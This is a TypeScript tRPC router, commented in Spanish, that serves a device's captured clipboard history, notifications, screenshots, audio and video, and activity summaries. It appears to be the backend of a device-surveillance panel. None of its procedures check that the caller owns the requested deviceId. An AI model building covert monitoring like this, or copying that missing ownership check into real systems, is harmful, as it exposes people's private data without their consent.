import { protectedProcedure, router } from "../_core/trpc";
import { advancedMonitoring } from "../advancedMonitoring";
import { z } from "zod";

export const advancedMonitoringRouter = router({
  /**
   * Obtener historial de clipboard
   */
  getClipboardHistory: protectedProcedure
    .input(z.object({ deviceId: z.number(), limit: z.number().default(100) }))
    .query(async ({ input }) => {
      return await advancedMonitoring.getClipboardHistory(input.deviceId, input.limit);
    }),

  /**
   * Obtener notificaciones capturadas
   */
  getNotifications: protectedProcedure
    .input(z.object({ deviceId: z.number(), limit: z.number().default(100) }))
    .query(async ({ input }) => {
      return await advancedMonitoring.getNotifications(input.deviceId, input.limit);
    }),

  /**
   * Obtener capturas de media
   */
  getMediaCaptures: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        type: z.enum(["screenshot", "audio", "video"]).optional(),
        limit: z.number().default(100),
      })
    )
    .query(async ({ input }) => {
      return await advancedMonitoring.getMediaCaptures(
        input.deviceId,
        input.type,
        input.limit
      );
    }),

  /**
   * Obtener estadísticas de monitoreo
   */
  getMonitoringStats: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .query(async ({ input }) => {
      return await advancedMonitoring.getMonitoringStats(input.deviceId);
    }),

  /**
   * Buscar en clipboard
   */
  searchClipboard: protectedProcedure
    .input(z.object({ deviceId: z.number(), query: z.string() }))
    .query(async ({ input }) => {
      return await advancedMonitoring.searchClipboard(input.deviceId, input.query);
    }),

  /**
   * Obtener resumen de actividad reciente
   */
  getActivitySummary: protectedProcedure
    .input(z.object({ deviceId: z.number(), hoursBack: z.number().default(24) }))
    .query(async ({ input }) => {
      return await advancedMonitoring.getActivitySummary(
        input.deviceId,
        input.hoursBack
      );
    }),

  /**
   * Limpiar capturas antiguas
   */
  cleanupOldCaptures: protectedProcedure
    .input(z.object({ deviceId: z.number(), daysOld: z.number().default(30) }))
    .mutation(async ({ input }) => {
      return await advancedMonitoring.cleanupOldCaptures(
        input.deviceId,
        input.daysOld
      );
    }),
});
